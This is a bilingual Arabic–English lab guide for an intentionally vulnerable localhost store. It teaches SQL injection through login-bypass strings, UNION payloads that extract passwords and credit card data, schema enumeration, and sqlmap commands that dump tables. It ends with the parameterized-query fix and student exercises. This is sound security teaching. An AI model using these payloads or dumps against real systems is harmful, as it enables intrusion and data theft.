# Week 5 — SQL Injection Lab (PixelCart mobile store)

> ⚠️ **تحذير / Warning**
> الـ app دي فيها ثغرات **متعمدة** لأغراض تعليمية بس.
> شغّلها على `localhost` بس، وماتنشرهاش على أي سيرفر عام.
> This application is **intentionally vulnerable**. Use on `localhost` only, never deploy it.

الهدف من الـ section: تفهم SQL Injection من الأول، تعمل UNION-based attack بإيدك، وبعدين تعمل أتمتة بالأداة sqlmap — وفي الآخر تشوف الإصلاح الصح.

---

## 0) تشغيل الـ lab / Running the lab

متطلبات: Node.js 18+ (اتجرب على 23).

```bash
npm install
npm start          # VULNERABLE mode  -> http://localhost:3000
```

عشان تشغّل النسخة المحمية (الإصلاح) بعدين:

```bash
# Linux / macOS
SECURE=1 node server.js

# Windows PowerShell
$env:SECURE=1; node server.js
```

الـ DB بيتبني في الذاكرة من جديد في كل مرة بتشغّل فيها، يعني لو خربت حاجة اقفل وشغّل تاني ويرجع زي الأول.

### الـ endpoints اللي هنلعب عليها

| Endpoint | السياق / Context | الثغرة |
|---|---|---|
| `GET /products?search=` | string (جوه quotes) | UNION-based, boolean, error |
| `GET /product?id=` | numeric (من غير quotes) | UNION-based, numeric |
| `POST /login` | string | authentication bypass |

كل صفحة بتطبعلك الـ SQL اللي اتنفذ فعلاً تحت، عشان تشوف الـ input بيدخل جوه الـ query إزاي.

---

## 1) SQL Injection Fundamentals

### الفكرة في سطر
الـ SQL Injection بتحصل لما الـ app بتاخد input من المستخدم وتحطه **جوه نص الـ query** كنص خام (string concatenation)، من غير فصل بين «الكود» (الـ SQL) و«الداتا» (الـ input). ساعتها الـ input يقدر يغيّر معنى الـ query نفسها.

بُص على الكود المصاب في `server.js` عند الـ login:

```js
const sql =
  "SELECT id, username, is_admin FROM users " +
  "WHERE username = '" + u + "' AND password = '" + p + "'";
```

لو المستخدم كتب في خانة الـ username القيمة دي:

```
admin'--
```

الـ query بتبقى كده:

```sql
SELECT id, username, is_admin FROM users WHERE username = 'admin'--' AND password = '...'
```

- الـ `'` بتقفل الـ string بتاعة الـ username بدري.
- الـ `--` بتبدأ comment في SQL، فكل اللي بعدها (فحص الـ password) بيتلغي.
- النتيجة: بتدخل كـ admin من غير ما تعرف الـ password.

جرّبها: افتح `/login` وحط username:

```
admin'--
```

وأي حاجة في الـ password. المفروض يطلعلك «Login OK».

### Authentication bypass بطريقة تانية (OR 1=1)
في خانة الـ username اكتب:

```
' OR '1'='1
```

ده بيخلي شرط الـ WHERE صح دايماً، فبيرجّع أول user في الجدول (غالباً admin).

### أنواع الـ SQLi (خريطة سريعة)

- **In-band / UNION-based**: النتيجة بترجع في نفس الصفحة. ده اللي هنركز عليه النهارده.
- **Error-based**: بتستخرج البيانات من رسائل الـ error.
- **Boolean-based blind**: مفيش output مباشر، بتسأل الـ DB أسئلة صح/غلط وتستنتج من رد الصفحة.
- **Time-based blind**: زي الـ boolean بس بتستنتج من إن الرد اتأخر (sleep).

---

## 2) UNION-based Injection — خطوة بخطوة

فكرة الـ `UNION`: بيلزق نتيجة `SELECT` تانية تحت نتيجة الـ query الأصلية. شرطين لازم يتحققوا:

1. نفس **عدد الأعمدة** في الـ SELECT الأصلي والمحقون.
2. الأنواع **متوافقة** في الأعمدة اللي هتتعرض.

هنشتغل على بحث المنتجات:

```
GET /products?search=...
```

الـ query الأصلية بترجّع 4 أعمدة:

```sql
SELECT id, name, description, price FROM products WHERE name LIKE '%<search>%'
```

### الخطوة 1 — عدّ الأعمدة بـ ORDER BY
جرّب تزوّد الرقم لحد ما الـ query تقع:

```
zzz' ORDER BY 1-- 
zzz' ORDER BY 2-- 
zzz' ORDER BY 4-- 
zzz' ORDER BY 5--      <-- هنا بيطلع error => الأعمدة 4
```

اكتب الـ payload في خانة البحث (من غير ما تحط الـ `search=`؛ الفورم بيعمل كده لوحده). مثال القيمة:

```
zzz' ORDER BY 5-- 
```

> ملاحظة: في آخر الـ payload في مسافة بعد الـ `--`. ده مهم في SQLite وMySQL عشان الـ comment يشتغل صح.

### الخطوة 2 — اطلع عدد الأعمدة الصح واعرف الظاهر منها
دلوقتي عرفنا إنهم 4. جرّب UNION بأرقام عشان تشوف أنهي أعمدة بتتعرض على الشاشة:

```
zzz' UNION SELECT 1,2,3,4-- 
```

هتلاقي صف فيه 1,2,3,4 ظهر في الجدول => الأعمدة الأربعة كلها بتتعرض.

### الخطوة 3 — استخرج البيانات الحساسة
دلوقتي بدّل الأرقام بأسماء أعمدة حقيقية من جدول الـ users:

```
zzz' UNION SELECT id, username, password, is_admin FROM users-- 
```

المفروض يطلعلك الـ usernames والـ passwords بتاعة كل المستخدمين في جدول النتايج.

### الخطوة 4 — Database fingerprinting (SQLite)
اعرف نسخة الـ DB:

```
zzz' UNION SELECT 1, sqlite_version(), 3, 4-- 
```

اعرف أسماء الجداول من الـ catalog بتاع SQLite:

```
zzz' UNION SELECT 1, name, sql, 4 FROM sqlite_master WHERE type='table'-- 
```

### نفس الحكاية على السياق الرقمي /product?id=
هنا مفيش quotes حوالين الـ id، فمش محتاج `'`:

```
GET /product?id=0 UNION SELECT id, username, password, credit_card FROM users-- 
```

في المتصفح الـ URL بيتكتب كده (المسافات تبقى `%20`):

```
http://localhost:3000/product?id=0%20UNION%20SELECT%20id,username,password,credit_card%20FROM%20users--%20
```

استخدمنا `id=0` عشان المنتج رقم 0 مش موجود، فالنتيجة الوحيدة اللي تظهر تبقى بتاعة الـ UNION بتاعتنا.

---

## 3) الأتمتة بـ sqlmap / Automating with sqlmap

sqlmap أداة بتكتشف وتستغل الـ SQLi أوتوماتيك. بدل ما تعمل كل الخطوات اللي فوق بإيدك، بتديها الـ URL وهي تعمل الباقي.

### التثبيت / Install

```bash
# أسهل طريقة لو عندك Python:
pip install sqlmap

# أو من git:
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
python sqlmap/sqlmap.py --version

# على Kali متنصبة أصلاً: اكتب sqlmap
```

> ملاحظة: شغّل الـ app الأول (`npm start`) قبل ما تجرّب أي أمر sqlmap.

### 3.0) الاستخدام الأساسي / Basic usage

الـ workflow الأساسي 4 خطوات بالترتيب: **كشف ← جداول ← أعمدة ← سحب**.

1) كشف الثغرة:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch
```

2) اعرض الجداول:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
```

3) اعرض أعمدة جدول الـ users:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
```

4) اسحب بيانات الـ users (الهدف):

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
```

أعمدة محددة بس:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users -C username,password --dump
```

كل الداتا دفعة واحدة:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --dump-all
```

> **مهم على SQLite:** الـ `--dbs` مبيشتغلش لأن SQLite ملهوش كذا database (الملف نفسه هو الـ DB). sqlmap هيقولك `use only '--tables'`. ده تحذير طبيعي مش فشل — استخدم `--tables` على طول.

#### لو عندك طلب محفوظ من Burp (request file)

بدل ما تكتب الـ URL والـ parameters بإيدك، احفظ الطلب في ملف واستخدم `-r`:

```bash
sqlmap -r ./search.req --batch --tables
sqlmap -r ./search.req --batch -T users --dump
```

> لو sqlmap كتب `resumed ... from stored session`، يبقى شغّال من نتيجة فحص قديمة. عشان تعيد الفحص من الأول زوّد `--flush-session`.

الفلاجز الأساسية:

| Flag | بيعمل إيه |
|---|---|
| `-u` | الـ target URL (فيه parameter) |
| `-r` | يقرا الطلب من ملف محفوظ |
| `--batch` | يجاوب بالافتراضي من غير ما يوقفك |
| `--tables` | يعدّد الجداول |
| `-T` | يختار جدول |
| `-C` | يختار أعمدة معينة |
| `--dump` | يسحب بيانات الجدول |
| `--dump-all` | يسحب كل الجداول |

ملاحظة: الداتا المسحوبة بتتخزن كمان في ملفات تحت:

```
~/.local/share/sqlmap/output/
```

### 3.1) كشف الثغرة في السياق الرقمي

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch
```

- `-u` الـ target URL (لازم يكون فيه parameter زي `id`).
- `--batch` خليها تجاوب على كل الأسئلة بالإجابة الافتراضية من غير ما تسألك.

### 3.2) اعرض قواعد البيانات والجداول

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --dbs
sqlmap -u "http://localhost:3000/product?id=1" --batch --tables
```

- `--dbs` يعرض قواعد البيانات الموجودة.
- `--tables` يعرض الجداول.

### 3.3) اسحب الأعمدة وبيانات جدول الـ users

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --columns
sqlmap -u "http://localhost:3000/product?id=1" --batch -T users --dump
```

- `-T users` تحديد الجدول.
- `--columns` يعرض أعمدة الجدول.
- `--dump` يسحب كل بيانات الجدول (هنا هتشوف الـ passwords والكروت).

### 3.4) على بحث المنتجات (string context)

```bash
sqlmap -u "http://localhost:3000/products?search=Nova" -p search --batch --dump -T users
```

- `-p search` يقوله الـ parameter اللي يهاجمه هو `search`.

### 3.5) على الـ login (طلب POST)

```bash
sqlmap -u "http://localhost:3000/login" \
       --data="username=admin&password=admin" \
       -p username --batch --dump -T users
```

- `--data` بيانات الـ POST body؛ وجودها بيخلي sqlmap يستخدم POST تلقائياً.
- `-p username` الـ parameter اللي يختبره.

### فلاجز مفيدة تانية

| Flag | بيعمل إيه |
|---|---|
| `--current-db` | اسم قاعدة البيانات الحالية |
| `--current-user` | مستخدم الـ DB الحالي |
| `--level=5 --risk=3` | يزوّد شمول الفحص (payloads أكتر) |
| `--technique=U` | يجرّب UNION بس (B/E/U/S/T/Q للباقي) |
| `--dbms=sqlite` | يقوله نوع الـ DB عشان يسرّع |
| `--dump-all` | يسحب كل الداتا من كل الجداول |
| `-r request.txt` | يقرا طلب HTTP محفوظ من Burp بدل ما تكتب الـ URL |

مثال مركّز لـ UNION على SQLite:

```bash
sqlmap -u "http://localhost:3000/product?id=1" --batch --dbms=sqlite --technique=U --dump -T users
```

---

## 4) الإصلاح / The Fix — Parameterized Queries

الحل الصح: **تفصل الكود عن الداتا** باستخدام parameterized queries (prepared statements)، فالـ input يتعامل كقيمة مش كـ SQL.

بدل الدمج بالنصوص:

```js
// ❌ هش / vulnerable
const sql = "SELECT * FROM users WHERE username = '" + u + "'";
```

استخدم placeholders:

```js
// ✅ آمن / safe
const stmt = db.prepare('SELECT * FROM users WHERE username = ?');
stmt.bind([u]);
```

شغّل النسخة الآمنة وجرّب نفس الـ payloads اللي كسرت الـ app قبل كده:

```bash
# Windows PowerShell
$env:SECURE=1; node server.js
```

- الـ `admin'--` في الـ login هيبقى username غلط فعلاً => «Invalid credentials».
- الـ UNION في البحث هيتعامل كنص بحث عادي => «No rows returned».

دروس إضافية للدفاع:

- **Parameterized queries / ORM** هي خط الدفاع الأساسي.
- **Least privilege**: حساب الـ DB بتاع الـ app ماياخدش صلاحيات أكتر من اللازم.
- **Input validation / allow-list** للقيم المتوقعة (زي إن الـ id لازم رقم).
- **ماتعرضش رسائل الـ error** الخام للمستخدم.

---

## 5) تمارين للطلبة / Exercises

1. استخدم UNION عشان تطلع الـ `email` بتاع الـ `admin` بس (hint: `WHERE`).
2. اطلع كل أسماء الجداول في الـ DB باستخدام `sqlite_master`.
3. اعمل authentication bypass بطريقة تالتة غير اللي فوق.
4. شغّل sqlmap على الـ `/login` واسحب جدول الـ users بالكامل.
5. شغّل الـ SECURE mode وأثبت إن كل حاجة فاتت بقت فاشلة. ليه الـ `?` فرق؟

الحلول في ملف `INSTRUCTOR.md`.
